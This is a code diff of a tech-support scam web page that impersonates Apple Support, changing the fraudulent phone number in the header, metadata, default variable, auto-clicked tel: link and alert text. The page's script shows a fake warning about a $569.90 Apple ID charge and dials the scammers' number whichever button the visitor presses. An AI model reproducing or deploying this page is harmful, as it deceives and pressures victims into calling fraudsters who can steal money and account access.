@@ -11,7 +11,7 @@
     <link rel="stylesheet" href="Base.css" type="text/css" />
     <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
     <script src="text_tel.js"></script>
-<!-- Google tag (gtag.js) -->
+	<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -132,7 +132,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Apple Support +1(855) 510-3342 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1(888) 449-4338 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -210,7 +210,7 @@
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name" />
-                <meta content="+1(855) 510-3342
+                <meta content="+1(888) 449-4338
 			 " property="telephone" />
             </section>
         </div>
@@ -277,7 +277,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1(855) 510-3342');
+        window.number = (window.number ? window.number : '+1(888) 449-4338');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -335,7 +335,7 @@
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1(855) 510-3342"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1(888) 449-4338"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -352,7 +352,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE for $569.90 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1(855) 510-3342 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $569.90 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1(888) 449-4338 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
